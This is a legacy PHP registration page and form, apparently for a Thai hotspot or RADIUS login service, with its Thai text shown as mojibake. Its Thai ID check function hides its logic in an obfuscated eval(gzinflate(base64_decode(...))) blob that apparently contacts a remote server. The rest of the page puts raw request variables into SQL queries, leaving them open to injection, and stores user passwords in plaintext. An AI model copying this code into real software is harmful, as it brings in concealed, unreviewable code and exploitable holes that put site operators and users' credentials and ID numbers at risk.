<?php
include("Connections/dbconnect.php");
include("include/function.php");
if($submit=="�ѹ�֡") {

if($UserName ==""  or $password==""  or  $room ==""   or $fullname==""   or  $email=="")  {
  	         echo                  "<script type=text/javascript>";
		    echo                  "alert('��س� ��͡������  ���� ���ʡ��  �����Ţ�ѵû�ЪҪ�  �Ţ��Шӵ�ǹѡ�֡��           ')";
	        echo                  "</script>";  
		    echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  
			}
			

 
 if(ereg ("[[:punct:]]",$UserName))  {  
 
   	         echo                  "<script type=text/javascript>";
		    echo                  "alert('   ����������к� ��� ���ʼ�ҹ  �����յ���ѡ�þ����  ')";
	        echo                  "</script>";  
		  echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  
}
 
function thaiIDCheck($stringID){
/*
function coded by Sarun101
return:
1, 0, -1 (positive, zero, negative)
(��ͧ��� php5 ���� php4 ���Ҩ���� + zlib + curl + pcre)
�ŷ������ 3 Ẻ
 1= positive (��ҹ��õ�Ǩ�ͺ)
 0= ��������Ѵ ���ͧ�ҡ server �ҹ��������� ���� �ա������¹�ŧ�ç���ҧ������
-1= negative (����պѵû�ЪҪ���������ԧ)
 */
$evaler=
'jZNLa9tAEMfvBn+HPYisBLLkVRNIW3QoiQKGNA6y3EtIjSqtLRE9'.
'FmmNUoI/TEzBxdfWLX1cXGPai6Hu45BbDj3E0A/RtfyIHNy6i2Bm'.
'Z3/z1zI7w0WYPjE9tfgwn3PrPFJVEuFGzTep5fBQfnqCCrunJ8XC'.
'/dMLpLQ4GYqAi2nkBo3SviBc5HOc1Yy8mqOmxg1cygtMKt3FmIaE'.
'8nNCBHtV/bB8bNSYEQF0KCUPZDlJEunMCQPqmK5khb48dTwzsBsm'.
'xYn5XA5w4gY2PichkYhD4Eb543LFEAGNmvi/0IOSdrhfEUE+B4kZ'.
'xxGuq1BiHA6s0MY8/DIYv/r0uz0ajN93++3JqH81hIIEt6A0zXBt'.
'xPC4+YwVhV9WRgRFEaAspaylkAi2s9S9tdQO+7LU9not9ksli+2s'.
'x5Q7N2PU8ngRxj4hiYrYmu2ZjO/S1br0LocdKORzG4tslB5r5Sp7'.
'kt2NqK4ZVf3I0B8dVQ40/fYROcvB1hkxG3jWZ/gcW4vspajlhTHO'.
'Rrm0i9FqR3/88frFYDzpvP15I/vTbl5K36YoqynXw/aHwdeX33vj'.
'z8x2v3Xf/erfvLm67E1Gnb9qIJVfOCrKSvMLZxZmQzfn0mmajyNi'.
'Jy3sxTgDKFmALxbS9JYsa4EN3Pqc/xfyBw==';
eval(gzinflate(base64_decode($evaler)));unset($evaler);
return $retVal;
}//End function


$a=thaiIDCheck($strID);
 
 if($none_chk_idperdb=='1')  {  $a=1;}

if($a==0) {
            echo                  "<script type=text/javascript>";
		    echo                  "alert('�������ö�Դ��� Server ��þҡ� �� ')";
	        echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php>"; 
		 	exit();
}
if($a==-1) {
            echo                  "<script type=text/javascript>";
		    echo                  "alert('�����Ţ�ѵû�Шӵ�ǻ�ЪҪ��Դ��Ҵ')";
	        echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php>"; 
		 	exit();
}


$query_user = "select  *  from register  
                                                      where UserName='$UserName'   
													                       or  fullname='$fullname'  
																		       
																		   or  per='$strID'                      ";

$type_db = mysql_query($query_user, $connect_db) or die(mysql_error());

$totalRows_user= mysql_num_rows($type_db);

if(    $totalRows_user >0 ) 
{   //��Ǩ�ͺ��� �� userlogin ��������������
            echo                  "<script type=text/javascript>";
		    echo                  "alert('�� user login ���������к����� ')";
	        echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php>"; 
		 	exit();
}  else 
{             
if($a==1     ) { //����Ţ���ѵû�ЪҪ��ը�ԧ
$register_day=date("Y-m-d H:i:s");
mysql_query("INSERT INTO  register    (UserName,password,per,room,tel,fullname,status,email,site,register_day,idstd)
		      values('$UserName','$password','$strID','$room','$tel','$fullname','0','$email','$site','$register_day','$idstd')") or die(mysql_error());
 

 

//�ѧ�Ѻ�Դ��ҹ���


if($allow_register==1) { 
############################################################
  update("register","status ='1'","where UserName ='$UserName'");  
#############
mysql_query("INSERT INTO  radcheck     (UserName,Attribute ,op ,Value)
		                                                                          values('$UserName','User-Password','==','$password')") or die(mysql_error());
mysql_query("INSERT INTO  usergroup     (UserName,GroupName ,priority)
		                                                                          values('$UserName','defult','1')") or die(mysql_error());
#################
}

 	            echo                  "<script type=text/javascript>";
 		    echo                  "alert('�ѹ�֡���������º��������  ')";
         echo                  "</script>";
		    echo "<meta http-equiv=refresh content=0;URL=index.php?a=200>"; 
		 	exit();  
			}//  end  �ͧ  if($a==1) {		  
}




}

 
?>
<HTML>
<HEAD>
<TITLE>km</TITLE>
<meta http-equiv="Content-Type" content="text/html; charset=windows-874">
</HEAD>


<BODY >
<p align="center"><strong><font size="3" face="MS Sans Serif, Tahoma, sans-serif">��ͧ��͡���������ú�ء��ͧ��Ф�Ѻ<br>
  �ҡ���������������ԧ�������ú ������Դ�����ҹ�Թ����������Ѻ</font></strong></p>
          <form method="post" name="form1" action="index.php?case_i=2" onSubmit="return chkIDCard()">

  <table width="100%" border="1" align="left">
    <tr valign="baseline"> 
      <td width="126" align="right" nowrap bgcolor="#FFFFCC"><strong><font color="#0000CC" size="2" face="MS Sans Serif, Tahoma, sans-serif"><span class="style5">���������ҹ:</span></font></strong></td>
      <td colspan="2" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><strong><font color="#FF0000">���� 
        EN ��ҹ�������ժ�ͧ��ҧ �� UserName</font></strong><br>
        <input name="UserName" type="text" id="UserName" size="32">
        * </font></td>
    </tr>
    <tr valign="baseline"> 
      <td align="right" nowrap bgcolor="#FFFFCC"><strong><font color="#0000CC" size="2" face="MS Sans Serif, Tahoma, sans-serif">���ʼ�ҹ</font></strong></td>
      <td colspan="2" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><strong><font color="#FF0000">���� 
        EN ��ҹ�� ���͵���Ţ</font></strong><br>
        <input name="password" type="password" id="password" value="" size="32">
        * </font></td>
    </tr>
    <tr valign="baseline"> 
      <td align="right" nowrap bgcolor="#FFFFCC"><strong><font color="#0000CC" size="2" face="MS Sans Serif, Tahoma, sans-serif">���͹��ʡ��</font></strong></td>
      <td colspan="2" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><strong><font color="#0000CC"><font color="#FF0000">�������� 
        �������ú��駪��͹��ʡ�� �� &nbsp;���� �آ�ͧ</font></font></strong><br>
        <input name="fullname" type="text" id="fullname" value="" size="32">
        * </font></td>
    </tr>
    <tr valign="baseline"> 
      <td height="41" align="right" nowrap bgcolor="#FFFFCC"><strong><font color="#0000CC" size="2" face="MS Sans Serif, Tahoma, sans-serif"><?php echo "$roomsDB"; ?> 
         </font></strong></td>
      <td colspan="2" bgcolor="#FFFFFF"> <font size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
        <font color="#FF0000"><strong> </strong></font><br>
        <input name="room" type="text" id="room" value="" size="32">
        * </font></td>
    </tr>
    <tr valign="baseline"> 
      <td align="right" nowrap bgcolor="#FFFFCC"><strong><font size="2" face="MS Sans Serif, Tahoma, sans-serif" color="#0000CC"><strong><?php echo "$siteDB"; ?></strong></font> 
        </strong></td>
      <td colspan="2" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
        <font color="#FF0000"><strong> </strong></font><br>
		<input name="site" type="text" id="site" value="" size="32">
        
        </font></td>
    </tr>
	    <tr valign="baseline"> 
      <td align="right" nowrap bgcolor="#FFFFCC"><strong><font size="2" face="MS Sans Serif, Tahoma, sans-serif" color="#0000CC"><strong><?php echo "$idstdDB"; ?></strong></font> 
        </strong></td>
      <td colspan="2" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
        <font color="#FF0000"><strong> </strong></font><br>
		<input name="idstd" type="text" id="idstd" value="" size="32">
        
        </font></td>
    </tr>
    <tr valign="baseline"> 
      <td align="right" nowrap bgcolor="#FFFFCC"><strong><font color="#0000CC" size="2" face="MS Sans Serif, Tahoma, sans-serif">�Ţ��Шӵ�ǻ�ЪҪ�</font></strong></td>
      <td colspan="2" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><strong><font color="#FF0000">�ô�������ԧ�����ҡ �� 314100484617</font></strong> 
         <br>
        <input name="strID" type="text" id="strID" value="" size="32">
        *<strong><font color="#FF0000"> </font></strong></font></td>
    </tr>
    <tr valign="baseline"> 
      <td height="52" align="right" nowrap bgcolor="#FFFFCC"><font color="#0000CC" size="2" face="MS Sans Serif, Tahoma, sans-serif"><strong>�������Ѿ��Դ��͡�Ѻ</strong></font></td>
      <td colspan="2" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><strong><font color="#0000CC"><font color="#FF0000">�ô��� 
        �Ъ��·�ҹ���ҡ�óշ�ҹ<br>
        �ջѭ��㹡����ҹ  �� 08-111111</font></font></strong><br>
        <input name="tel" type="text" id="tel" value="" size="32">
        </font></td>
    </tr>
    <tr valign="baseline"> 
      <td align="right" nowrap bgcolor="#FFFFCC"><strong><font color="#0000FF" size="2" face="MS Sans Serif, Tahoma, sans-serif">E-Mail</font></strong></td>
      <td colspan="2" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><strong><font color="#FF0000">�óշ�ҹ������ʼ�ҹ �� admin@domain.com</font><font color="#0000FF"><br>
        <input name="email" type="text" id="email" value="" size="32">
        </font></strong></font></td>
    </tr>
    <tr valign="baseline"> 
      <td colspan="3" align="right" nowrap bgcolor="#FFFFFF"><div align="left"><font size="2" face="MS Sans Serif, Tahoma, sans-serif">*<strong><font color="#FF0000">��ͨ��繵�ͧ��͡</font></strong></font></div></td>
    </tr>
    <tr valign="baseline"> 
      <td align="right" nowrap bgcolor="#FFFFFF"><font color="#0000CC" size="2" face="MS Sans Serif, Tahoma, sans-serif">&nbsp;</font></td>
      <td width="218" bgcolor="#FFFFFF"><div align="center"> <font size="2" face="MS Sans Serif, Tahoma, sans-serif"> 
          <input type="submit" value="�ѹ�֡" name="submit"    >
          </font></div></td>
      <td width="296" bgcolor="#FFFFFF"><font size="2" face="MS Sans Serif, Tahoma, sans-serif">&nbsp;</font></td>
    </tr>
  </table>
        </form>
</BODY>
</HTML>